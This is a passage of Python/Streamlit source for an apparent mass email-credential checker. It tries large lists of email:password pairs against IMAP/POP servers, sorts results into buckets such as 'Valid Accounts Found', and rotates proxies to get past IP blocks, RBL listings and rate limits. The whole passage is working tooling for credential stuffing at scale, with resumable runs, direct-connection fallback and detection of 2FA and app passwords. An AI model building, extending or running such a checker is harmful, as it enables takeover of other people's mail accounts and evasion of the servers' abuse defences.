                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)

                            if st_val == LOGIN_DROPPED:
                                flags["saw_login_drop"] = True
                                trace_logs.append(
                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
                                    f"password still untested; continuing the ladder")

                            if st_val in (APP, WRONG):
                                res, had_net, saw_retry, act = _handle_app_or_wrong(
                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                    had_net, saw_retry)
                                if res is not None:
                                    return res, had_net, saw_retry
                                if act == "retry_user":
                                    continue
                                server_level_fail = True
                                rotate_now = False
                            elif st_val == RETRY:
                                saw_retry = True
                                server_level_fail = True
                                if "lookup failed" in err_text.lower():
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on "
                                                      f"{server}:{port} -> advancing to next "
                                                      f"host (no proxy rotation)")
                                else:
                                    rotate_now = True
                            elif st_val == RBL:
                                trace_logs.append(f"{px_tag(px_used)} RBL block on "
                                                  f"{server}:{port} -> IP flagged by server, "
                                                  f"advancing")
                                server_level_fail = True
                            elif u_idx + 1 < len(users) and st_val in (UNKNOWN, LOGIN_DROPPED):
                                flags["saw_server"] = True
                                px_used, _ok = _rotate_to_fresh(px_used, seen_px,
                                                                "local-part retry", keep_node=True)
                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> "
                                                  f"retrying same host as local-part "
                                                  f"'{users[u_idx + 1]}'")
                                continue
                            elif st_val == LOGIN_DROPPED:
                                server_level_fail = True
                                rotate_now = False
                                trace_logs.append(
                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> "
                                    f"advancing the ladder (POP3 / other hosts still get a turn)")
                            else:
                                server_level_fail = True
                                rotate_now = rotate_now or proxy_level
                                if (_is_timeout(e) and _timeout_kind(e) == "connect"
                                        and not conn_rotated.get(server)):
                                    conn_rotated[server] = True
                                    rotate_now = True

                        if proxy_dead:
                            break
                        if server_level_fail:
                            break

                    # FIX P2-1: a same-node 407 retry only earns its slot if a REAL
                    # attempt still fits.  The old guard asked for 3s of window and
                    # then slept 0.8s and burned a full attempt.
                    if retry_same_node and (deadline_ts - time.time()) > (per_to * PROXY_407_RETRY_WINDOW_FACTOR):
                        trace_logs.append(
                            f"{px_tag(px_used)} 407 looks like the provider's per-sub-user cap "
                            f"-> settling {PROXY_407_BACKOFF}s and retrying the SAME node once")
                        time.sleep(PROXY_407_BACKOFF)
                        continue

                    if retry_same and (deadline_ts - time.time()) > 5.0:
                        trace_logs.append(
                            f"{px_tag(px_used)} Host answered slowly -> backoff "
                            f"{SLOW_RETRY_BACKOFF}s, retrying {server}:{port} in place "
                            f"[{retries_by_host.get(server, 0)}/{same_host_retries}]")
                        time.sleep(SLOW_RETRY_BACKOFF)
                        continue

                    can_rotate = (
                        rotate_now and px_used and rotations_left > 0
                        and (deadline_ts - time.time()) > max(2.0, per_to * 0.5)
                    )
                    if can_rotate:
                        time.sleep(ROTATE_SETTLE)
                        newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
                        if newpx and newpx not in seen_px:
                            seen_px.add(newpx)
                            px_used = newpx
                            rotations_left -= 1
                            trace_logs.append(f"{px_tag(px_used)} Rotating proxy -> retrying "
                                              f"{server}:{port} "
                                              f"(host kept, {'407' if proxy_dead else 'net'})")
                            continue

                    if proxy_dead and acct_407 >= PROXY_407_FORCE_DIRECT:
                        trace_logs.append(
                            f"407 storm breaker: {acct_407} proxy-auth failure(s) in this rung "
                            f"-> bypassing the remaining hosts and going DIRECT.")
                        force_direct["flag"] = True
                        return None, had_net, saw_retry

                    break

            return None, had_net, saw_retry
# @@END 102 CORE_SWEEP

# @@BLOCK 103 CORE_PHASES deps=010,016,025,100,102
        def run_phase(px_used, plan_used, deadline_ts, tag):
            if not plan_used:
                return None, False, False

            res, net, ret = sweep(px_used, plan_used, deadline_ts, f"{tag} · pass 1",
                                  allow_rotate=True)
            if res or force_direct["flag"]:
                return res, net, ret

            if CFG.get("CHECK_PASS2", CHECK_PASS2_DEFAULT) and net \
                    and (deadline_ts - time.time()) > 3.0:
                retry_rungs = [r for r in plan_used if r[1] in net_failed_hosts]
                if retry_rungs:
                    res2, net2, ret2 = sweep(px_used, retry_rungs, deadline_ts,
                                             f"{tag} · pass 2 (fresh proxy per failed host)",
                                             allow_rotate=True)
                    return res2, (net or net2), (ret or ret2)
            return None, net, ret

        direct_first = bool(CFG.get("DIRECT_FIRST", False))
        if proxy_mode == "off":
            direct_first = True
        if not direct_first and proxy_pool:
            try:
                if quarantine_size() >= max(3, int(len(proxy_pool) * 0.5)):
                    direct_first = True
                    trace_logs.append(f"Pool {quarantine_size()}/{len(proxy_pool)} quarantined "
                                      f"-> auto Direct-First.")
            except Exception:
                pass
        # v13.54: A 402-DOMINANT POOL GOES DIRECT FIRST. The provider is refusing
        # service on nodes that are alive, so spending the proxy phase on them
        # before trying the direct egress is pure waste - and with the node now
        # kept in the pool (block 071) the phase can be wholly 402 and yield
        # nothing. This mirrors the quarantine rule above.
        if not direct_first and proxy_pool:
            try:
                _ds_ok, _ds_auth, _ds_plan, _ds_to, _ds_dead = probe_summary()
                if _ds_plan and not _ds_ok and _ds_plan >= max(3, int(len(proxy_pool) * 0.5)):
                    direct_first = True
                    trace_logs.append(
                        f"Pool is 402-dominant ({_ds_plan}/{len(proxy_pool)} refused service, "
                        f"0 passed) -> auto Direct-First.")
            except Exception:
                pass

        allow_proxy = bool(px) and proxy_mode != "off" and not proxy_is_quarantined(px)
        direct_gate = (px is None or proxy_mode == "fallback"
                       or bool(CFG.get("RETRY_CONNECTION_FAILED")) or force_direct["flag"]
                       or flags["saw_407"])
        allow_direct = bool(direct_gate)

        def _run_direct(primary_dl, hard_dl):
            nonlocal retryable
            dp = [r for r in primary_plan if fast_fail_dns_check(r[1])] or primary_plan
            df = [r for r in fallback_plan if fast_fail_dns_check(r[1])]
            dgeo = direct_geo()
            trace_logs.append(f"direct | {dgeo['ip']} | {dgeo['region']} | "
                              f"{dgeo['country']} | {dgeo['vpn']}")
            trace_logs.append(f"DIRECT sweep over {len(dp)} locally-resolving host(s).")
            res, _nf, ret = run_phase(None, dp, primary_dl, "direct")
            retryable = retryable or ret
            if res:
                return res
            if (hard_dl - time.time()) > 4.0:
                res, _nf2, _r = run_phase(None, df, hard_dl, "direct/legacy")
                if res:
                    return res
            return None

        def _run_proxy(primary_dl, hard_dl):
            nonlocal retryable, net_fail
            if not allow_proxy:
                if proxy_mode != "off" and not proxy_pool:
                    trace_logs.append("No live proxy in the pool -> running only the DIRECT sweep.")
                return None
            res, nf, ret = run_phase(px, primary_plan, primary_dl, "proxy")
            retryable = retryable or ret
            net_fail = net_fail or nf
            if res:
                return res
            if not force_direct["flag"] and (hard_dl - time.time()) > 4.0:
                res, _n, _r = run_phase(px, fallback_plan, hard_dl, "proxy/legacy")
                if res:
                    return res
            return None

        if direct_first and allow_direct:
            trace_logs.append("Phase order: DIRECT first, proxy as fallback.")
            res = _run_direct(t_start + (budget * DIRECT_FIRST_DIRECT_PRIMARY_FRAC),
                              t_start + (budget * DIRECT_FIRST_DIRECT_TOTAL_FRAC))
            if res:
                return res
            if allow_proxy:
                res = _run_proxy(t_start + (budget * DIRECT_FIRST_PROXY_START_FRAC),
                                 hard_deadline)
                if res:
                    return res
        else:
            res = _run_proxy(proxy_primary_deadline, proxy_deadline)
            if res:
                return res
            if force_direct["flag"]:
                trace_logs.append("407 storm breaker tripped -> bypassing the rest of the "
                                  "proxy pool and running the DIRECT sweep now.")
            # FIX P0-2: allow_direct was latched BEFORE the proxy phase ran, so in
            # Proxy Mode = aggressive with Retry CF off a 407-flooded proxy phase
            # could never fall through to DIRECT - the direct_reason fix was
            # defeated one line later by the frozen gate.  Recompute it now that
            # we know what actually happened.
            # v13.54: saw_plan joins the reasons. A 402 sets none of the others, so
            # a wholly 402 proxy phase produced no verdict AND no direct sweep.
            allow_direct = (allow_direct or force_direct["flag"] or flags["saw_407"]
                            or flags.get("saw_plan") or acct_407_total > 0
                            or net_fail or retryable)
            direct_reason = (px is None) or net_fail or retryable or force_direct["flag"] \
                or flags["saw_407"] or flags.get("saw_plan") or acct_407_total > 0
            if allow_direct and direct_reason:
                res = _run_direct(direct_primary_deadline, hard_deadline)
                if res:
                    return res
# @@END 103 CORE_PHASES

# @@BLOCK 104 CORE_TAIL deps=016,023,100,103
    except Exception as e:
        trace_logs.append(f"Critical Exception in runner: {str(e)}")
        if best_verdict["status"] is not None:
            return (None, best_verdict["status"],
                    best_verdict["detail"] or "retained verdict", None, trace_logs)
        return None, FAILED, str(e)[:40], None, trace_logs

    if best_verdict["status"] is not None:
        _bh = best_verdict.get("host") or ""
        _foreign = bool(_bh) and not _is_local_host(_bh)
        if _foreign:
            trace_logs.append(
                f"NOTE: retained [{best_verdict['status']}] came from FOREIGN host {_bh} "
                f"(not local for {domain}). Discarded - a public host does not decide the account."
            )
            best_verdict["status"] = None
            best_verdict["detail"] = ""
            best_verdict["host"] = ""
        else:
            detail = best_verdict["detail"] or "retained verdict"
            if best_verdict["status"] == WRONG:
                _wn = _wrong_detail_note(domain, password)
                if _wn and _wn not in detail:
                    detail = detail + _wn
            if best_verdict["status"] == LOGIN_DROPPED:
                detail = f"{detail} | " + _login_dropped_detail()
            trace_logs.append("Ladder exhausted with no live answer -> returning retained "
                              f"verdict [{best_verdict['status']}].")
            return None, best_verdict["status"], detail, None, trace_logs

    if flags["saw_407"] and not flags.get("saw_server") \
            and acct_407_total >= PROXY_407_FORCE_DIRECT:
        trace_logs.append(
            f"Every attempt died in the PROXY hop ({acct_407_total} x 407, "
            f"{quarantine_size()} node(s) quarantined) -> the mailbox was never "
            f"reached, so the password is still untested. Per-host 407 map: {host_407}")
        return None, PROXY_UNHEALTHY, (
            f"proxy refused the MAIL ports with 407 on {acct_407_total} attempt(s) - the mail "
            f"host was never reached, so the password is still untested. Each of those nodes "
            f"was re-tested on the 443 control first: the pool authenticates and the provider "
            f"is refusing the mail destination (destination scope, or the plan's concurrency "
            f"cap). Set Proxy Mode Engine = off (DIRECT) for the run."
        ), None, trace_logs
    if not dns_ok and not flags.get("saw_server") and not flags.get("saw_login_drop"):
        return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
    if flags.get("saw_login_drop"):
        trace_logs.append(
            "Mail host answered, accepted the LOGIN command, then closed the socket "
            "(* BYE) before returning a verdict - server-side drop, not a network fault.")
        return None, LOGIN_DROPPED, _login_dropped_detail(), None, trace_logs
    # v13.51: a refused STARTTLS is its OWN answer.  The 143 rung was reaching
    # this point and the saw_server branch below then claimed LOGIN had been
    # issued and dropped, which was untrue - starttls() raises before LOGIN.
    # v13.52: the outer line is unchanged.  The two extra guards are nested so a
    # pinned needle still matches, and they stop one TLS refusal burying a real
    # RETRY / RBL answer from a later rung.
    if flags.get("saw_tls_refused") and not flags.get("saw_auth"):
        if not retryable and not flags.get("saw_login_drop"):
            trace_logs.append(
                "Host was reached but refused the TLS upgrade itself (STARTTLS not "
                "supported) - no LOGIN was ever issued, so the password is untested. "
                "The 993 rung is the one that matters on this host.")
            return None, CONNECTION_FAILED, (
                "host reachable but refused STARTTLS on 143 - no LOGIN was attempted, so the "
                "password is untested. Only the implicit-TLS port (993) can answer here; if it "
                "timed out, retry from a different egress or check the host's TLS listener"
            ), None, trace_logs
    # v13.54: THE 402 TAIL. Without this a wholly 402 run ended on the generic
    # "all hosts unreachable" text, which blames the mail host for a provider
    # bandwidth/plan refusal and tells the user nothing they can act on.
    if flags.get("saw_plan") and not flags.get("saw_server") and not retryable:
        trace_logs.append(
            "Every rung answered 402 Payment Required in the PROXY hop and no host ever "
            "answered - the mailbox was never reached, so the password is untested. "
            "The provider is refusing SERVICE on nodes that are alive and authenticated.")
        return None, PROXY_UNHEALTHY, (
            "the provider returned 402 Payment Required on every proxy attempt - the plan's "
            "bandwidth or concurrency is spent. Those nodes are alive and authenticate, so "
            "the password is untested and NOT wrong. Set Proxy Mode Engine = off (DIRECT), "
            "or wait for the plan to reset, then re-run these accounts."
        ), None, trace_logs
    # v13.57: THE 403 TAIL. A provider that refuses the DESTINATION PORT on every
    # node answers 403 - which is neither a dead node nor a credential problem, and
    # is what Webshare does permanently on 25 / 110 / 465 / 587. It used to set
    # saw_server, so the generic tail at the bottom claimed the mail host had been
    # reached and had dropped the LOGIN; the CONNECT never got there at all.
    # saw_port_block is its own flag now, the guards keep it from burying a real
    # answer from a later rung, and the verdict is PROXY_UNHEALTHY - the passwords
    # are UNTESTED, not wrong.
    if flags.get("saw_port_block") and not flags.get("saw_server") \
            and not flags.get("saw_auth") and not retryable:
        trace_logs.append(
            "Every rung answered 403 client_connect_forbidden_port in the PROXY hop - the "
            "provider refuses these DESTINATION PORTS by policy, so the mailbox was never "
            "reached and no LOGIN was ever issued. The nodes and the credentials are both "
            "fine; the password is untested.")
        return None, PROXY_UNHEALTHY, (
            "the provider refused the destination port with 403 on every proxy attempt - "
            "Webshare blocks 25, 110, 465 and 587 permanently on every plan, so an IMAP/POP "
            "rung on those ports can never pass through a Webshare node. The node and the "
            "credential are both fine: the password is UNTESTED, not wrong. Set Proxy Mode "
            "Engine = off (DIRECT), or dial a mail port the plan allows (993 / 995)."
        ), None, trace_logs
    if retryable:
        return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
    if flags.get("saw_server"):
        trace_logs.append(
            "Hosts answered and LOGIN was issued, but every server dropped the "
            "connection before a verdict -> password still untested.")
        return None, FAILED, (
            "mail host reached but the server dropped LOGIN (server-side) - try the "
            "other protocol/host, or an app password"
        ), None, trace_logs
    return None, FAILED, ("all hosts unreachable (timeouts/refused) - password could not "
                          "be tested"), None, trace_logs
# @@END 104 CORE_TAIL

# @@BLOCK 105 RUN_TRIGGER_UI deps=019,034,055,083,087
section_title("🚀", "Execute Live Checking Engine",
              "proxy-backed, post-auth verified, resumable")

RESULT_ACTION_MODES = BUCKETS
ACTION_OPTIONS = list(PREFILTER_LABELS) + [label for label, _ in BUCKETS]

col_action1, col_action2 = str_lit.columns([0.65, 0.35])
with col_action1:
    start_engine_btn = str_lit.button("🔥 Start Live Checking Engine", type="primary")
    stop_engine_btn = str_lit.button(
        "⏹ Stop Engine (records the reason)",
        help="A click reruns the script, which kills the run loop. Stop stamps the "
             "reason on the run record FIRST, then reruns, so the next page load "
             "reports 'Stopped by user' and leaves the queue resumable.")
with col_action2:
    _seed_widget("bb_action_mode", choices=ACTION_OPTIONS, dflt=ACTION_OPTIONS[0])
    engine_action_mode = str_lit.selectbox(
        "Engine Action Mode:", options=ACTION_OPTIONS,
        key="bb_action_mode",
        help="Pick a pre-filter bucket (SMTP Failed sits right after DNS Failed) or a "
             "previous result bucket to re-run."
    )
    if engine_action_mode == "Resume Unfinished":
        # runstate.summary() reads the watchdog record, so this is the truth about
        # whether anything is actually resumable - not a glob that always matched.
        _rs_lines = runstate.summary()
        if _rs_lines:
            for _rs_line in _rs_lines:
                str_lit.text(_rs_line)
        else:
            str_lit.caption("No interrupted run recorded.")

# FIX SPEED-8: this used to run at MODULE level on every rerun - a full read and
# filter of proxies.txt for a value only the start path below ever consumes. The
# sidebar (block 080) already computes its own filtered_pool for display.
#
# v13.70 ISO-9: AND THIS LINE IS A CROSS-SESSION HAZARD. It is a module global,
# it is reset to [] on EVERY rerun of EVERY session, and check_task used to read
# it from globals at call time. So any rerun anywhere - the other tab of the same
# person, another user loading the page - emptied the pool out from under a live
# run and every remaining account silently fell through to DIRECT with no proxy
# at all. check_task now takes the pool as an ARGUMENT and block 106 copies it
# once, per run, before the first future exists.
active_proxy_pool = []


# v13.53: progress_bar / status_text are bound at MODULE scope behind a null shim.
# They are only ever CREATED on the start path, yet block 107 writes to both and
# block 108 runs on EVERY page load - so on any load that never entered the start
# branch both names were unbound, every write raised NameError, and the surrounding
# try/except swallowed it. That is exactly why the screen sat frozen on the last
# line instead of reporting what it was doing. The shim absorbs the calls instead.
class _NullUI:
    def progress(self, *a, **k):
        return self

    def text(self, *a, **k):
        return self

    def info(self, *a, **k):
        return self

    def success(self, *a, **k):
        return self

    def error(self, *a, **k):
        return self

    def warning(self, *a, **k):
        return self

    def metric(self, *a, **k):
        return self


progress_bar = _NullUI()
status_text = _NullUI()

# The stop is a rerun with a reason attached: the click tears the loop down
# before anything below executes, so the stamp has to happen here and the
# interrupt itself is performed by block 007 on the next load.
if stop_engine_btn and STATE.get("run_active"):
    runstate.note("Stopped by user (Stop button)")
    str_lit.rerun()

if start_engine_btn:
    clear_proxy_quarantine()
    log_probe_event("run start: 407 quarantine cleared")
    progress_bar = str_lit.progress(0, text=f"Initializing checking engine "
                                            f"for [{engine_action_mode}]...")
    status_text = str_lit.empty()
    status_text.info("⏳ Opening the engine - resolving hosts, pre-testing the proxy pool, "
                     "geo-tagging nodes.")

    log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode "
                f"on category: [{engine_action_mode}].")
    log_startup(
        f"RUN CONFIG -> protocols={CFG.get('PROTOCOLS')} workers={CFG.get('MAX_WORKERS_START')} "
        f"deadline={CFG.get('ACCOUNT_DEADLINE')}s "
        f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
        f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
        f"confirm_wrong={CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')} "
        f"retry_direct={CFG.get('RETRY_CONNECTION_FAILED')} debug={CFG.get('DEBUG')} "
        f"test_flight={CFG.get('PROXY_TEST_FLIGHT')} "
        f"allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
        f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
        f"smtp_precheck={CFG.get('SMTP_CHECK')} connection={CFG.get('CONNECTION_HINT')} "
        f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
        f"subuser_conc={CFG.get('PROXY_SUBUSER_CONCURRENCY')} "
        f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
        f"max_rotations={CFG.get('MAX_ROTATIONS')} check_pass2={CFG.get('CHECK_PASS2')} "
        f"direct_first={CFG.get('DIRECT_FIRST')} mail_spot={CFG.get('MAIL_SPOT_CHECK')}"
    )

    resume_lines = []
    if engine_action_mode == "Resume Unfinished":
        resume_lines = runstate.remaining()

    _label_to_key = dict(RESULT_ACTION_MODES)

    def _raw_of(line):
        return line.split("|")[0].strip()

    category_queue_map = {
        "Ready to Check": clean_lines,
        "Resume Unfinished": resume_lines,
        "Disposables": disp,
        "Typos": typo,
        "Skip previously valid": resume,
        "App-Skipped": app_skip,
        "Custom Filtered": custom_skipped,
        "DNS Failed": dns_skipped,
        "SMTP Failed": smtp_skipped,
    }
    if engine_action_mode in _label_to_key:
        category_queue_map[engine_action_mode] = [
            _raw_of(x) for x in str_lit.session_state.get(_label_to_key[engine_action_mode], [])
        ]

    accounts_to_check = category_queue_map.get(engine_action_mode, [])

    if not accounts_to_check:
        str_lit.warning(f"⚠ No accounts found in the selected category: "
                        f"'{engine_action_mode}'.")
        if engine_action_mode == "Resume Unfinished":
            _rec = runstate.load() or {}
            str_lit.caption(
                f"Record: state={_rec.get('state', 'none')} | "
                f"{_rec.get('checked', 0)}/{_rec.get('total', 0)} checked | "
                f"reason={_rec.get('reason') or _rec.get('cause') or 'none'} | "
                f"remaining file={'present' if runstate.remaining() else 'empty/absent'}")
    else:
        # The pool is filtered HERE, once, on the start path only.
        active_proxy_pool = get_filtered_active_proxies()
        filtered_pool[:] = active_proxy_pool

        # FIX ISO-4 (v13.49) put the counter here; v13.53 moves it into block 106's
        # try. Claimed here it sat OUTSIDE any finally, so a throw in the cold-pool
        # wait, the tab build or the bucket placeholders below left runs_active
        # permanently +1 and the deployment believed a run was live forever.
        # Claimed inside the try it is always paired with the release.

        # v13.70 ISO-10: the comparison reads THIS session's own target, not the
        # process mirror - STATE is written by whoever started a run last.
        try:
            _prev_tg = list(_user_state().get("probe_targets_override") or [])
        except Exception:
            _prev_tg = []
        _tg = _set_probe_targets_from_queue(
            accounts_to_check,
            cap=max(1, int(CFG.get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT))))
        _targets_changed = bool(_tg) and list(_tg) != _prev_tg

        with alive_pool_lock:
            _pool_warm = bool(alive_pool)

        if not _pool_warm:
            # FIX SPEED-2: this used to wait up to PROBE_BUDGET_START + 10 (130s)
            # for the probe lock and then run a FULL 120s forced probe before the
            # first account was even submitted. On Resume Unfinished that is
            # minutes of spinner with nothing happening. Wait briefly, then start
            # on whatever exists - the per-account ladder falls through to DIRECT
            # by itself when the pool is empty.
            with str_lit.spinner("Cold pool - brief wait for the probe, then starting..."):
                _t0 = time.time()
                while _PROBE_OWNER_LOCK.locked() and (time.time() - _t0) < 20.0:
                    time.sleep(0.2)
                with alive_pool_lock:
                    _pool_warm = bool(alive_pool)
                if not _pool_warm:
                    refresh_alive_pool(force=True, budget=45.0)
                    with alive_pool_lock:
                        _pool_warm = bool(alive_pool)
                if not _pool_warm:
                    status_text.info("⏳ Pool still cold - starting anyway; accounts will "
                                     "fall through to DIRECT.")
        elif _targets_changed and CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT) == PROBE_TARGET_AUTO:
            threading.Thread(
                target=lambda: refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET),
                daemon=True, name="start-refresh").start()
            log_probe_event("start: pool warm, target changed -> background refresh, "
                            "run starts immediately")

        # ---- THE ARMED POOL, AND IT SAYS WHAT IT ARMED -----------------------
        # FIX PLAN-2 (v13.64): the pool was copied wholesale and the run began
        # without a word about its composition, so a pool that was half spent read
        # exactly like a healthy one until the first account's ladder collapsed into
        # DIRECT. _pool_tiers() is the same three-tier split block 069 draws from:
        # A passed, B 402-only, C everything else. The counts are logged and a
        # plan-only pool warns BEFORE the first account is submitted.
        _armed_plan = 0
        if alive_pool:
            active_proxy_pool = list(alive_pool)
            _tier_a, _tier_b, _tier_c = _pool_tiers(active_proxy_pool)
            _armed_plan = len(_tier_b)
            log_startup(
                f"ARMED POOL -> {len(_tier_a)} node(s) passed the probe, "
                f"{_armed_plan} kept only because they answered 402 (drawn last), "
                f"{len(_tier_c)} other; {len(active_proxy_pool)} armed of "
                f"{len(filtered_pool)} filtered / {len(all_proxies)} loaded."
            )
            if _armed_plan and not _tier_a:
                status_text.warning(
                    f"⚠ Every one of the {len(active_proxy_pool)} armed node(s) last "
                    f"answered 402 Payment Required. They are alive and authenticate, so "
                    f"each account tries them first and then falls through to DIRECT - "
                    f"which costs ladder time. Proxy Mode Engine = off finishes the run "
                    f"faster while the plan is spent.")
            elif _armed_plan:
                status_text.info(
                    f"ℹ {_armed_plan} of the {len(active_proxy_pool)} armed node(s) last "
                    f"answered 402 and are drawn only when no passing node is free.")
        elif CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT):
            active_proxy_pool = []
            log_startup("ARMED POOL -> empty: STRICT is on and no node passed the probe. "
                        "Every account runs DIRECT.")
        else:
            active_proxy_pool = list(filtered_pool)
            log_startup(f"ARMED POOL -> empty pool with STRICT OFF, so the {len(active_proxy_pool)} "
                        f"filtered line(s) are armed UNVALIDATED.")

        log_startup(
            f"PROXY HEALTH BANNER -> loaded={len(all_proxies)} filtered={len(filtered_pool)} "
            f"alive={len(alive_pool)} quarantined={quarantine_size()}"
        )
        _msr = STATE.get("mail_spot") or {}
        # v13.54: only my own spot check - see block 073.
        if _msr.get("user") and _msr.get("user") != _gate_scope():
            _msr = {}
        if _msr.get("auth") and not _msr.get("ok") and _msr.get("n"):
            str_lit.error(
                f"🚨 **The mail-destination spot check says the pool cannot reach MAIL "
                f"ports** - {_msr['auth']}/{_msr['n']} sampled node(s) returned 407 "
                f"against {_msr['host']}:{_msr['port']}. Every one of those nodes was "
                f"re-tested on 443 first, so read the histogram: 'auth' means the node "
                f"itself failed and the credential/plan is the problem, 'auth_dest' means "
                f"the node is fine and only the mail port is refused. Either way the "
                f"passwords are untested - set **Proxy Mode Engine = off** (DIRECT)."
            )
        elif _msr.get("plan") and not _msr.get("ok") and _msr.get("n"):
            # v13.64: the 402 case had no start-path banner at all.
            str_lit.warning(
                f"⚠ **The mail-destination spot check answered 402 Payment Required on "
                f"{_msr['plan']}/{_msr['n']} sampled node(s)** against "
                f"{_msr['host']}:{_msr['port']}. Those nodes are alive and authenticate; "
                f"the plan's bandwidth is spent, so a proxy attempt cannot reach a "
                f"mailbox. The run continues and every account falls through to DIRECT "
                f"on its own - set **Proxy Mode Engine = off** to skip the wasted proxy "
                f"phase entirely."
            )
        if all_proxies and not alive_pool:
            str_lit.warning(
                "⚠ **Proxy health: 0 nodes passed the tunnel probe.** Every account will run "
                "DIRECT. Press 📥 Fetch & Test All Proxies, then try again - that is a pool "
                "problem, not a mailbox problem."
            )

        with session_state_lock:
            str_lit.session_state.valid_results = load_persistent_valid_results()
            str_lit.session_state.run_valid_count = 0
            str_lit.session_state.clean_valid_count = 0
            str_lit.session_state.wrong_results = []
            str_lit.session_state.need_app_results = []
            str_lit.session_state.conn_results = []
            str_lit.session_state.proxy_results = []
            str_lit.session_state.login_drop_results = []
            str_lit.session_state.retry_results = []
            str_lit.session_state.rbl_results = []
            str_lit.session_state.smtp_results = list(str_lit.session_state.get("pre_smtp_failed", []))
            str_lit.session_state.dns_results = list(str_lit.session_state.get("pre_dns_failed", []))
            str_lit.session_state.skip_results = []
            str_lit.session_state.unknown_results = []
            # FIX LAG-7 (v13.67): both of these were plain lists and the run loop
            # trimmed them with pop(0) / del[:-N] on EVERY result. After the cap
            # was reached that is a 5,000-element shift and a 20,000-element slice
            # copy per account - roughly 2.4 billion element moves across a
            # 120,000-account run, on the same thread that feeds the UI. A deque
            # with maxlen trims in O(1).
            log_cap = LOG_CAP_DEBUG if CFG.get("DEBUG", False) else LOG_CAP_QUIET
            str_lit.session_state.report_entries = deque(maxlen=REPORT_ENTRIES_MAX)
            str_lit.session_state.log_lines = deque(maxlen=log_cap)
            str_lit.session_state.checked_emails_set = set()
            str_lit.session_state.last_checked_index = 0
            str_lit.session_state.engine_has_run = True
            str_lit.session_state.run_completion_status = "Unfinished"

            start_dt = datetime.now()
            # FIX SURVIVE-1 (v13.67): ONE stamp for the whole run. The bucket
            # journal opens on it here and the export block re-uses it, so the live
            # files and the exported files are the same files - a fresh stamp at
            # export time would orphan every line written during the run.
            _run_stamp = start_dt.strftime("%Y%m%d_%H%M%S")
            str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.end_timestamp = None
            str_lit.session_state.total_duration = None

        exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream",
                                             "📊 Live Report Log & Analytics"])
        with exec_tab1:
            log_container = str_lit.empty()
        with exec_tab2:
            report_metrics_placeholder = str_lit.empty()
            bucket_placeholders = {}
            BUCKET_SPEC = [
                ("valid_results", "✅ Valid Accounts Found"),
                ("wrong_results", "❌ Wrong Password Found"),
                ("login_drop_results", "🚪 Login Dropped (* BYE)"),
                ("conn_results", "🔌 Connection Failed Found"),
                ("proxy_results", "🩹 Proxy Unhealthy Found"),
                ("need_app_results", "🔐 App Password / 2FA Found"),
                ("retry_results", "🕓 RETRY_LATER Found"),
                ("rbl_results", "🚫 RBL Blocked Found"),
                ("smtp_results", "📮 SMTP Failed (pre-check)"),
                ("dns_results", "🛰 DNS Failed (pre-check)"),
                ("skip_results", "⏭ Skipped / Filtered"),
                ("unknown_results", "❓ Unclassified"),
            ]
            for _key, _title in BUCKET_SPEC:
                with str_lit.expander(f"{_title}", expanded=False):
                    bucket_placeholders[_key] = str_lit.empty()
            report_log_container = str_lit.empty()

        all_target_accounts = (accounts_to_check[:CFG["MAX_ACCOUNTS"]]
                               if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check)
        total_accs = len(all_target_accounts)
        checked_count = 0
        # The queue is final and counted - open the run record here.
        _rs_path = runstate.begin(total_accs)
        thread_local = threading.local()
        # FIX SCOPE-1 (v13.57): the run's gate scope and its config are captured
        # HERE, on the script thread, before a single future exists. Every task pins
        # both on its own worker, so a rerun in another tab (or this one) can no
        # longer swap the scope under a live account or hand it another user's CFG.
        _run_scope = _gate_scope()
        _run_cfg = _cfg_snapshot()
        _last_ui_ts = 0.0
        _last_df_ts = 0.0
        _last_ck_ts = 0.0
        _last_clean_ts = 0.0
        _net_streak = 0

        def render_buckets(snapshot):
            """ONE markdown call per bucket, not one per account line.

            FIX DELTA-1 (v13.67): this opened a fresh `.container()` on the
            placeholder and then emitted a separate widget for every line, on
            every tick. Twelve buckets x up to 2000 lines is up to 24,000 widgets
            per tick at 8.3 ticks a second - the delta stream outran the socket
            and the browser answered "Failed to process a Websocket message.
            RangeError: index out of range", after which it stopped applying
            deltas and the page looked hung while the run carried on.

            The bucket is a single HTML block now, capped at BUCKET_LIVE_TAIL.
            The summary block still shows the full set.
            """
            for key, _title in BUCKET_SPEC:
                ph = bucket_placeholders.get(key)
                if ph is None:
                    continue
                items = snapshot.get(key) or []
                if not items:
                    continue
                col = TAG_COLORS.get(BUCKET_TAGS.get(key, ""), "#cbd5e1")
                tail = items[-BUCKET_LIVE_TAIL:]
                body = "".join(
                    "<div style='font-family:ui-monospace,monospace;font-size:12px;"
                    f"color:{col}'>{html.escape(str(ln))}</div>" for ln in tail)
                if len(items) > len(tail):
                    body += ("<div style='font-size:11px;opacity:.7'>+"
                             f"{len(items) - len(tail)} more - see the summary below"
                             "</div>")
                try:
